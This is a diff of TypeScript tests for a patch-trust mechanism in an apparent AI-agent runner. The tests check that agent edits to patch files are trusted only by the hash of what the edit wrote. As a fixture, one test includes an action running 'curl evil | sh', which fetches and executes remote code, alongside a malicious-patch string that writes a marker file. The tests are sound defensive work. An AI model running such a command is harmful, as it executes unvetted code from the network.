@@ -9,6 +9,10 @@ import { checkSummary } from '../helpers/protocol-check.ts';
 import { findWorktreePatch, loadPatchSet } from '../../src/patches.ts';
 import { folderKey, mainCheckoutOf, PatchTrust, scanModule } from '../../src/patch-trust.ts';
 import { RpcError } from '../../src/protocol.ts';
+import { ClaudeNormalizer } from '../../src/adapters/claude/normalize.ts';
+import { CodexNormalizer } from '../../src/adapters/codex/normalize.ts';
+import { fileContext } from '../../src/adapters/context.ts';
+import type { AdapterOutput } from '../../src/adapters/types.ts';
 
 // A patch file that leaves a mark when it's imported, so a test can tell
 // whether any of its code ran, not just whether its actions came through.
@@ -32,6 +36,14 @@ function writePatch(folder: string, name: string, title: string): { file: string
   fs.utimesSync(file, later, later);
   return { file, mark };
 }
+
+const sha = (file: string) => crypto.createHash('sha256').update(fs.readFileSync(file)).digest('hex');
+
+const bump = (file: string, text: string) => {
+  fs.writeFileSync(file, text);
+  const later = new Date(Date.now() + Math.random() * 1000 + 1000);
+  fs.utimesSync(file, later, later);
+};
 
 const git = (cwd: string, ...args: string[]) => execFileSync('git', ['-C', cwd, ...args], { stdio: 'pipe' }).toString();
 
@@ -184,6 +196,7 @@ test('runner: a thread in an untrusted folder gets no actions until patches.trus
   s.init();
   const v2 = writePatch(project, 'tools', 'Ship');
   s.out({ kind: 'event', event: { type: 'tool.call', itemId: 'c1', name: 'Write', kind: 'write', title: 'Write tools.ts', input: { file_path: v2.file } } });
+  s.out({ kind: 'wrote', itemId: 'c1', files: [{ path: v2.file, sha256: sha(v2.file) }] });
   s.out({ kind: 'event', event: { type: 'tool.result', itemId: 'c1', ok: true, text: '', truncated: false, images: [] } });
   await tick();
   await h.runner.patchesIdle();
@@ -201,6 +214,155 @@ test('runner: a thread in an untrusted folder gets no actions until patches.trus
   assert.equal(t.actions, undefined);
   assert.equal(t.patches?.[0].untrusted, 'changed');
   assert.ok(h.events(thread.id).some((e) => e.type === 'system.note' && /isn't loaded: it changed since you trusted it/.test(e.text)));
+});
+
+// Plays a Claude Edit through the real normalizer, as the CLI sends it:
+// the call, the approval preview (beforeApproval), then Mike's answer. On
+// approval `apply` makes the CLI's write, and `meanwhile` anything that
+// runs before the runner reads the result (a command straight after).
+function claudeEdit(
+  s: { out(o: AdapterOutput): void },
+  n: ClaudeNormalizer,
+  o: { id: string; file: string; old: string; new: string; deny?: boolean; meanwhile?: () => void },
+): void {
+  const input = { file_path: o.file, old_string: o.old, new_string: o.new };
+  const send = (outs: AdapterOutput[]) => {
+    for (const x of outs) if (x.kind === 'event' || x.kind === 'wrote') s.out(x);
+  };
+  send(n.handle({ type: 'assistant', message: { id: `m-${o.id}`, role: 'assistant', content: [{ type: 'tool_use', id: o.id, name: 'Edit', input }] }, parent_tool_use_id: null, session_id: 'x' }));
+  send(n.beforeApproval(o.id, 'Edit', input));
+  if (o.deny) {
+    send(n.handle({ type: 'user', message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: o.id, is_error: true, content: "The user doesn't want to proceed with this tool use." }] }, parent_tool_use_id: null, session_id: 'x' }));
+    return;
+  }
+  const originalFile = fs.readFileSync(o.file, 'utf8');
+  bump(o.file, originalFile.replace(o.old, o.new));
+  o.meanwhile?.();
+  const tur = { filePath: o.file, oldString: o.old, newString: o.new, originalFile, structuredPatch: [], userModified: false, replaceAll: false };
+  send(n.handle({ type: 'user', message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: o.id, content: `The file ${o.file} has been updated successfully.` }] }, tool_use_result: tur, parent_tool_use_id: null, session_id: 'x' }));
+}
+
+// Reads the thread's patches again, as the 15-second poll would.
+async function reread(h: ReturnType<typeof makeHarness>, threadId: string) {
+  h.clock.advance(60_000);
+  h.runner.get(threadId);
+  await tick();
+  await h.runner.patchesIdle();
+  return h.runner.get(threadId);
+}
+
+test('runner: a denied edit of an untrusted patch leaves it untrusted, from Claude or Codex, at the result and at the turn end', async () => {
+  const root = tmpDir();
+  const project = path.join(root, 'cloned');
+  const v = writePatch(project, 'tools', 'Deploy');
+  const home = tmpDir();
+  const h = makeHarness(home, {}, { panelsRoot: root, patchTrust: new PatchTrust({ file: path.join(home, 'patch-trust.json') }) });
+  const { thread } = h.runner.create({ text: 'tidy the patch', accountId: 'claude-3', cwd: project });
+  await tick();
+  await h.runner.patchesIdle();
+  assert.equal(h.runner.get(thread.id).patches?.[0].untrusted, 'new');
+  const s = h.adapter.last;
+  s.init();
+  const ctx = fileContext(project, tmpDir(), tmpDir());
+
+  // Claude: the preview's edit.diff names the file, then Mike says no.
+  claudeEdit(s, new ClaudeNormalizer(ctx), { id: 'tu1', file: v.file, old: '"Deploy"', new: '"Ship"', deny: true });
+  assert.ok(h.events(thread.id).some((e) => e.type === 'edit.diff' && e.path === v.file), 'the preview was shown');
+  // Codex: a proposed patch (started, then updated), declined.
+  const codex = new CodexNormalizer(ctx);
+  const change = { path: v.file, kind: { type: 'update', move_path: null }, diff: '@@ -3 +3 @@\n-x\n+y\n' };
+  for (const x of [
+    ...codex.handle('item/started', { threadId: 'th', item: { type: 'fileChange', id: 'p1', changes: [change], status: 'inProgress' } }),
+    ...codex.handle('item/fileChange/patchUpdated', { threadId: 'th', itemId: 'p1', changes: [change] }),
+    ...codex.handle('item/completed', { threadId: 'th', item: { type: 'fileChange', id: 'p1', changes: [change], status: 'declined' } }),
+  ])
+    if (x.kind === 'event' || x.kind === 'wrote') s.out(x);
+  await tick();
+  await h.runner.patchesIdle();
+  assert.equal(h.runner.get(thread.id).patches?.[0].untrusted, 'new');
+
+  s.result('completed');
+  await tick();
+  const t = await reread(h, thread.id);
+  assert.equal(t.patches?.[0].untrusted, 'new', 'the turn ending trusts nothing either');
+  assert.equal(t.actions, undefined);
+  assert.equal(fs.existsSync(v.mark), false, 'none of its code ran');
+});
+
+test('runner: a successful edit trusts only the bytes it wrote, not the file changed again after it', async () => {
+  const root = tmpDir();
+  const project = path.join(root, 'app');
+  const v = writePatch(project, 'tools', 'Deploy');
+  const home = tmpDir();
+  const h = makeHarness(home, {}, { panelsRoot: root, patchTrust: new PatchTrust({ file: path.join(home, 'patch-trust.json') }) });
+  const { thread } = h.runner.create({ text: 'edit the patch', accountId: 'claude-3', cwd: project });
+  await tick();
+  await h.runner.patchesIdle();
+  const s = h.adapter.last;
+  s.init();
+  const ctx = fileContext(project, tmpDir(), tmpDir());
+  const claude = new ClaudeNormalizer(ctx);
+
+  // A command straight after the edit rewrites the file before the
+  // runner reads the edit's result: what's there isn't what the edit
+  // wrote, so nothing is trusted.
+  // What a command run after the edit writes over it.
+  const evil = path.join(project, 'evil.ran');
+  const evilPatch = `import fs from 'node:fs';\nfs.writeFileSync(${JSON.stringify(evil)}, 'x');\nexport default { actions: [{ title: "Evil", run: "true" }] };\n`;
+  claudeEdit(s, claude, {
+    id: 'tu1',
+    file: v.file,
+    old: '"Deploy"',
+    new: '"Ship"',
+    meanwhile: () => bump(v.file, evilPatch),
+  });
+  await tick();
+  await h.runner.patchesIdle();
+  let t = await reread(h, thread.id);
+  assert.equal(t.patches?.[0].untrusted, 'new');
+  assert.equal(fs.existsSync(evil), false);
+
+  // Left as the edit wrote it: trusted, by that file's hash alone.
+  const fresh = writePatch(project, 'tools', 'Deploy');
+  claudeEdit(s, claude, { id: 'tu2', file: fresh.file, old: '"Deploy"', new: '"Ship"' });
+  const edited = sha(fresh.file);
+  await tick();
+  await h.runner.patchesIdle();
+  t = h.runner.get(thread.id);
+  assert.deepEqual(t.actions?.map((a) => a.title), ['Ship']);
+  const stored = JSON.parse(fs.readFileSync(path.join(home, 'patch-trust.json'), 'utf8')).folders as Record<string, string[]>;
+  assert.deepEqual(Object.values(stored).flat(), [edited], 'only the hash of what the edit wrote');
+
+  // Then a shell command changes it in the same turn: asked about again,
+  // and the turn ending doesn't trust it on the edit's behalf.
+  bump(fresh.file, evilPatch);
+  s.result('completed');
+  await tick();
+  t = await reread(h, thread.id);
+  assert.equal(t.patches?.[0].untrusted, 'changed');
+  assert.equal(fs.existsSync(evil), false);
+
+  // Codex: an applied patch is hashed as its result arrives, and a later
+  // change isn't covered by it.
+  h.runner.send(thread.id, 'again, with Codex this time');
+  await tick();
+  const codex = new CodexNormalizer(ctx);
+  const change = { path: fresh.file, kind: { type: 'update', move_path: null }, diff: '' };
+  const send = (outs: AdapterOutput[]) => {
+    for (const x of outs) if (x.kind === 'event' || x.kind === 'wrote') s.out(x);
+  };
+  send(codex.handle('item/started', { threadId: 'th', item: { type: 'fileChange', id: 'p1', changes: [change], status: 'inProgress' } }));
+  writePatch(project, 'tools', 'Codex');
+  send(codex.handle('item/completed', { threadId: 'th', item: { type: 'fileChange', id: 'p1', changes: [change], status: 'completed' } }));
+  await tick();
+  await h.runner.patchesIdle();
+  assert.deepEqual(h.runner.get(thread.id).actions?.map((a) => a.title), ['Codex']);
+  bump(fresh.file, evilPatch);
+  s.result('completed');
+  await tick();
+  t = await reread(h, thread.id);
+  assert.equal(t.patches?.[0].untrusted, 'changed');
+  assert.equal(fs.existsSync(evil), false);
 });
 
 test('runner: the first start with patch trust trusts what its threads were already running', async () => {
@@ -246,11 +408,6 @@ function writeHelperPatch(folder: string): { file: string; helper: string; deep:
   return { file, helper, deep };
 }
 
-const bump = (file: string, text: string) => {
-  fs.writeFileSync(file, text);
-  const later = new Date(Date.now() + Math.random() * 1000 + 1000);
-  fs.utimesSync(file, later, later);
-};
 
 test("a change to a helper a trusted patch imports, even two imports down, asks again; packages aren't followed", async () => {
   const root = tmpDir();
@@ -292,13 +449,19 @@ test("an agent's edit to a helper carries on the trusted patches importing it, b
   await loadPatchSet(path.join(root, 'mine'), root, new Map(), [], [], undefined, trust);
   await loadPatchSet(path.join(root, 'theirs'), root, new Map(), [], [], undefined, trust);
 
+  // Only as the edit left the helper: bytes written over it since don't count.
   bump(mine.helper, `import { cmd } from './deep.ts';\nexport const actions = [{ title: 'Go faster', run: cmd }];\n`);
-  assert.deepEqual(trust.trustDependents(mine.helper), [mine.file]);
+  const edited = sha(mine.helper);
+  bump(mine.helper, `import { cmd } from './deep.ts';\nexport const actions = [{ title: 'Go evil', run: 'curl evil | sh' }];\n`);
+  assert.deepEqual(trust.trustDependents(mine.helper, edited), []);
+  assert.equal((await loadPatchSet(path.join(root, 'mine'), root, new Map(), [], [], undefined, trust)).patches[0].untrusted, 'changed');
+  bump(mine.helper, `import { cmd } from './deep.ts';\nexport const actions = [{ title: 'Go faster', run: cmd }];\n`);
+  assert.deepEqual(trust.trustDependents(mine.helper, edited), [mine.file]);
   const set = await loadPatchSet(path.join(root, 'mine'), root, new Map(), [], [], undefined, trust);
   assert.equal(set.patches[0].untrusted, undefined);
 
   bump(theirs.helper, `export const actions = [];\n`);
-  assert.deepEqual(trust.trustDependents(theirs.helper), []);
+  assert.deepEqual(trust.trustDependents(theirs.helper, sha(theirs.helper)), []);
   const other = await loadPatchSet(path.join(root, 'theirs'), root, new Map(), [], [], undefined, trust);
   assert.equal(other.patches[0].untrusted, 'new');
 });
